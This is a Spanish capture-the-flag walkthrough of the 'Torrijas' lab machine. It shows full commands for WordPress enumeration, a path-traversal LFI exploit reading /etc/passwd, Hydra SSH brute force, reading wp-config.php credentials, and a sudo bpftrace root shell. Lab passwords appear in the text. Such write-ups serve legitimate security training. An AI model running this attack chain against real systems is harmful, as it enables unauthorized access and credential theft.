# 🧠 Torrijas | The HackersLabs

**Plataforma:** TheHackersLabs  
**Nombre de la máquina:** Torrijas  
**Dificultad:** Media  
**Enfoque:** WordPress, LFI, MySQL, fuerza bruta SSH, escalada de privilegios vía `bpftrace`

---

## 🔍 1. Escaneo de puertos con Nmap

```bash
nmap -p- --open -sS -sC -sV --min-rate 2000 -n -vvv -Pn 192.168.1.118
```

**Puertos abiertos:**

- 22/tcp → OpenSSH 9.2p1
- 80/tcp → Apache 2.4.62
- 3306/tcp → MariaDB 10.11.6


## 🌐 2. Análisis web (HTTP)

Al abrir `http://192.168.1.118/`, encontramos una web estática de recetas. No había funcionalidades sospechosas a simple vista.

<img width="938" height="380" alt="puerto80" src="https://github.com/user-attachments/assets/7d9ff159-3035-4521-a68c-351fb51336b4" />


## 🕵️ 3. Enumeración con Gobuster

```bash
gobuster dir -u http://192.168.1.118/ -w /usr/share/SecLists/Discovery/Web-Content/common.txt -x php
```

<img width="523" height="307" alt="gobuster" src="https://github.com/user-attachments/assets/a40dfb91-8fdd-4757-8cab-61fc42537e06" />

Se descubre `/wordpress/` y `/images/`.


## 📝 4. Escaneo WordPress

Usamos `wpscan`:

- Usuario identificado: **administrator**
- Plugin vulnerable: `web-directory-free` (vulnerable a **LFI**)
  
<img width="541" height="193" alt="wpscan-user" src="https://github.com/user-attachments/assets/283c584d-1b4d-4002-a363-daea9ba661a9" /><br>

<img width="526" height="395" alt="plugins-wp" src="https://github.com/user-attachments/assets/0c5c238d-7e35-4a77-ad91-ef9d795a5dca" />

## 💥 5. Explotación de LFI (CVE-2024-3673)

Se usa un exploit público para leer `/etc/passwd`:

```bash
python3 CVE-2024-3673.py --url http://192.168.1.118/wordpress --file ../../../../../../etc/passwd
```

<img width="1121" height="83" alt="exploit" src="https://github.com/user-attachments/assets/fc044f49-55e4-438a-8462-e4d1350c8ae9" />

Se identifican los usuarios `primo` y `premo`.


## 🔐 6. Fuerza bruta SSH con Hydra

```bash
hydra -l premo -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.118
```

<img width="1040" height="118" alt="hydra-password" src="https://github.com/user-attachments/assets/f7995062-6814-4996-9777-0ad3564db736" />

**Credenciales válidas:**

- Usuario: `premo`
- Contraseña: `cassandra`


## 💻 7. Acceso SSH

```bash
ssh premo@192.168.1.118
```

<img width="544" height="178" alt="login-ssh" src="https://github.com/user-attachments/assets/8f45230f-8a19-4985-8799-618c227ec65b" />

Acceso exitoso a la máquina.


## 📂 8. Credenciales desde wp-config.php

Inspeccionamos el archivo:

```bash
cat /var/www/html/wordpress/wp-config.php
```

<img width="486" height="520" alt="wp-config php" src="https://github.com/user-attachments/assets/fff5b59f-541b-4788-a48e-b0ac44003f15" />

Obtenemos credenciales MySQL:
- Usuario: `admin`
- Contraseña: `afdvasgvfdsabdgvs6a9vD8sv`


## 🐬 9. Acceso a bases de datos MariaDB

```bash
mysql -u root -p
```

Después:

```sql
mysql -u root -p
SHOW DATABASES;
USE Torrijas;
SELECT * FROM primo;
```

<img width="413" height="613" alt="database-mysql" src="https://github.com/user-attachments/assets/826a868d-ae7e-4bed-b5bc-28f7d6b44ed0" />

**Credenciales adicionales encontradas:**

- Usuario: `primo`
- Contraseña: `queazeshurmano`

Acceso exitoso a la máquina como usuario `primo`.

## ⬆️ 10. Escalada de privilegios (bpftrace)

Verificamos privilegios sudo:

```bash
sudo -l
```

<img width="583" height="67" alt="sudo -l" src="https://github.com/user-attachments/assets/729282b8-a842-4f47-8d24-0b997e84bb88" />

El usuario `primo` puede ejecutar `bpftrace` como root sin contraseña:

```bash
sudo bpftrace -c /bin/sh -e 'END {exit()}'
```

<img width="419" height="50" alt="escalada-root" src="https://github.com/user-attachments/assets/794612fc-1c2d-49b5-b14f-7e0a6caf4886" />

Y obtenemos **acceso como root**:

```bash
whoami
> root
```

---

## 🏁 Conclusión

Se obtiene acceso root mediante:

1. Enumeración de WordPress y explotación de LFI.
2. Descubrimiento de usuarios desde `/etc/passwd`.
3. Ataque de fuerza bruta SSH.
4. Análisis de configuración para acceder a MySQL.
5. Escalada de privilegios con `bpftrace`.
